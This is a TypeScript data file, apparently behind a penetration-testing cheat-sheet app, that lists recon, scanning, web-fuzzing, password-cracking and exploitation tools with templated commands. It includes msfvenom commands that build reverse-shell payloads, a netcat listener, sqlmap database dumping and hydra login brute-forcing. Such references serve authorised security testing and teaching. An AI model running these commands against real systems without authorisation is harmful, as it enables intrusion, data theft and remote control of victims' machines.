export interface Tool {
  name: string;
  description: string;
  commands: string[];
  category: string;
}

export const toolCategories = [
  {
    name: "Reconnaissance",
    icon: "Search",
    tools: [
      {
        name: "Whois",
        description: "Domain registration information",
        commands: [
          "whois {domain}",
          "whois {ip}"
        ]
      },
      {
        name: "DNS Enumeration",
        description: "DNS record lookup and enumeration",
        commands: [
          "dig {domain} ANY",
          "dig {domain} A",
          "dig {domain} MX",
          "dig {domain} NS",
          "dig {domain} TXT",
          "host {domain}",
          "nslookup {domain}"
        ]
      },
      {
        name: "Subdomain Enumeration",
        description: "Find subdomains of target",
        commands: [
          "subfinder -d {domain}",
          "assetfinder {domain}",
          "amass enum -d {domain}",
          "sublist3r -d {domain}"
        ]
      },
      {
        name: "Certificate Transparency",
        description: "Search CT logs for domains",
        commands: [
          "curl 'https://crt.sh/?q=%25.{domain}&output=json'",
          "certspotter {domain}"
        ]
      }
    ]
  },
  {
    name: "Port Scanning",
    icon: "Network",
    tools: [
      {
        name: "Nmap - Basic Scans",
        description: "Network discovery and security auditing",
        commands: [
          "nmap {ip}",
          "nmap -sV {ip}",
          "nmap -sC -sV {ip}",
          "nmap -p- {ip}",
          "nmap -A {ip}",
          "nmap -T4 -A -v {ip}"
        ]
      },
      {
        name: "Nmap - Advanced",
        description: "Specialized Nmap scans",
        commands: [
          "nmap -sS {ip}",
          "nmap -sU {ip}",
          "nmap -O {ip}",
          "nmap --script vuln {ip}",
          "nmap --script=default,discovery {ip}",
          "nmap -p 80,443 --script=http-enum {ip}"
        ]
      },
      {
        name: "Masscan",
        description: "Fast port scanner",
        commands: [
          "masscan {ip} -p1-65535 --rate=1000",
          "masscan {ip} -p80,443,8080,8443 --rate=10000"
        ]
      },
      {
        name: "Rustscan",
        description: "Modern port scanner",
        commands: [
          "rustscan -a {ip}",
          "rustscan -a {ip} -- -sV -sC"
        ]
      }
    ]
  },
  {
    name: "Web Enumeration",
    icon: "Globe",
    tools: [
      {
        name: "Gobuster",
        description: "Directory and file brute-forcing",
        commands: [
          "gobuster dir -u http://{domain} -w /usr/share/wordlists/dirb/common.txt",
          "gobuster dir -u http://{domain} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
          "gobuster dns -d {domain} -w /usr/share/wordlists/dnsmap.txt",
          "gobuster vhost -u http://{domain} -w /usr/share/wordlists/subdomains.txt"
        ]
      },
      {
        name: "Ffuf",
        description: "Fast web fuzzer",
        commands: [
          "ffuf -u http://{domain}/FUZZ -w /usr/share/wordlists/dirb/common.txt",
          "ffuf -u http://{domain}/FUZZ -w wordlist.txt -mc 200,301,302",
          "ffuf -u http://{domain} -H 'Host: FUZZ.{domain}' -w subdomains.txt",
          "ffuf -u http://{domain}/FUZZ -w wordlist.txt -recursion -recursion-depth 2"
        ]
      },
      {
        name: "Feroxbuster",
        description: "Fast content discovery",
        commands: [
          "feroxbuster -u http://{domain}",
          "feroxbuster -u http://{domain} -w /usr/share/wordlists/dirb/common.txt",
          "feroxbuster -u http://{domain} -x php,html,txt"
        ]
      },
      {
        name: "Dirsearch",
        description: "Web path scanner",
        commands: [
          "dirsearch -u http://{domain}",
          "dirsearch -u http://{domain} -e php,html,js",
          "dirsearch -u http://{domain} -w /usr/share/wordlists/dirb/common.txt"
        ]
      }
    ]
  },
  {
    name: "Vulnerability Scanning",
    icon: "ShieldAlert",
    tools: [
      {
        name: "Nikto",
        description: "Web server scanner",
        commands: [
          "nikto -h http://{domain}",
          "nikto -h {ip}",
          "nikto -h http://{domain} -Tuning 123bde"
        ]
      },
      {
        name: "Nuclei",
        description: "Vulnerability scanner based on templates",
        commands: [
          "nuclei -u http://{domain}",
          "nuclei -u http://{domain} -t cves/",
          "nuclei -u http://{domain} -severity critical,high",
          "nuclei -list urls.txt -t nuclei-templates/"
        ]
      },
      {
        name: "WPScan",
        description: "WordPress security scanner",
        commands: [
          "wpscan --url http://{domain}",
          "wpscan --url http://{domain} --enumerate u,p,t",
          "wpscan --url http://{domain} --api-token YOUR_TOKEN"
        ]
      },
      {
        name: "SQLMap",
        description: "SQL injection tool",
        commands: [
          "sqlmap -u 'http://{domain}/page?id=1'",
          "sqlmap -u 'http://{domain}/page?id=1' --dbs",
          "sqlmap -u 'http://{domain}/page?id=1' --dump",
          "sqlmap -u 'http://{domain}/page?id=1' --batch --level=5 --risk=3"
        ]
      }
    ]
  },
  {
    name: "Web Application Testing",
    icon: "Code",
    tools: [
      {
        name: "Burp Suite",
        description: "Web application security testing",
        commands: [
          "burpsuite &",
          "Configure proxy: 127.0.0.1:8080"
        ]
      },
      {
        name: "OWASP ZAP",
        description: "Web app security scanner",
        commands: [
          "zaproxy &",
          "zap.sh -quickurl http://{domain}",
          "zap.sh -cmd -quickurl http://{domain} -quickprogress"
        ]
      },
      {
        name: "Wfuzz",
        description: "Web application fuzzer",
        commands: [
          "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://{domain}/FUZZ",
          "wfuzz -c -z file,users.txt -z file,pass.txt http://{domain}/login?user=FUZZ&pass=FUZ2Z",
          "wfuzz -c -w wordlist.txt --hc 404 http://{domain}/FUZZ"
        ]
      },
      {
        name: "Arjun",
        description: "HTTP parameter discovery",
        commands: [
          "arjun -u http://{domain}",
          "arjun -u http://{domain}/endpoint -m GET",
          "arjun -u http://{domain}/endpoint -m POST"
        ]
      }
    ]
  },
  {
    name: "SSL/TLS Testing",
    icon: "Lock",
    tools: [
      {
        name: "SSLScan",
        description: "SSL/TLS scanner",
        commands: [
          "sslscan {domain}",
          "sslscan {ip}:443"
        ]
      },
      {
        name: "TestSSL",
        description: "SSL/TLS testing tool",
        commands: [
          "testssl.sh {domain}",
          "testssl.sh {ip}",
          "testssl.sh --vulnerable {domain}"
        ]
      },
      {
        name: "OpenSSL",
        description: "SSL/TLS toolkit",
        commands: [
          "openssl s_client -connect {domain}:443",
          "openssl s_client -connect {ip}:443 -showcerts"
        ]
      }
    ]
  },
  {
    name: "Network Analysis",
    icon: "Activity",
    tools: [
      {
        name: "Netcat",
        description: "Network utility for connections",
        commands: [
          "nc -zv {ip} 1-1000",
          "nc -lvnp 4444",
          "nc {ip} 80"
        ]
      },
      {
        name: "Tcpdump",
        description: "Packet analyzer",
        commands: [
          "tcpdump -i eth0",
          "tcpdump -i eth0 host {ip}",
          "tcpdump -i eth0 -w capture.pcap"
        ]
      },
      {
        name: "Wireshark",
        description: "Network protocol analyzer",
        commands: [
          "wireshark &",
          "tshark -i eth0 -f 'host {ip}'"
        ]
      }
    ]
  },
  {
    name: "Exploitation",
    icon: "Zap",
    tools: [
      {
        name: "Metasploit",
        description: "Penetration testing framework",
        commands: [
          "msfconsole",
          "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT=4444 -f elf > shell.elf",
          "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT=4444 -f exe > shell.exe"
        ]
      },
      {
        name: "SearchSploit",
        description: "Exploit database search",
        commands: [
          "searchsploit apache",
          "searchsploit -m 12345",
          "searchsploit --update"
        ]
      }
    ]
  },
  {
    name: "Password Attacks",
    icon: "Key",
    tools: [
      {
        name: "Hydra",
        description: "Login cracker",
        commands: [
          "hydra -l admin -P /usr/share/wordlists/rockyou.txt {ip} http-post-form",
          "hydra -L users.txt -P passwords.txt {ip} ssh",
          "hydra -l admin -P passwords.txt {ip} ftp"
        ]
      },
      {
        name: "John the Ripper",
        description: "Password cracker",
        commands: [
          "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
          "john --show hashes.txt"
        ]
      },
      {
        name: "Hashcat",
        description: "Advanced password recovery",
        commands: [
          "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
          "hashcat -m 1000 -a 0 hashes.txt wordlist.txt"
        ]
      }
    ]
  },
  {
    name: "Information Gathering",
    icon: "Database",
    tools: [
      {
        name: "theHarvester",
        description: "OSINT gathering tool",
        commands: [
          "theHarvester -d {domain} -b all",
          "theHarvester -d {domain} -b google,bing,linkedin"
        ]
      },
      {
        name: "Shodan",
        description: "Search engine for Internet-connected devices",
        commands: [
          "shodan search {domain}",
          "shodan host {ip}",
          "shodan download results '{domain}'"
        ]
      },
      {
        name: "Wayback Machine",
        description: "Historical site data",
        commands: [
          "waybackurls {domain}",
          "curl 'http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json'"
        ]
      }
    ]
  }
];
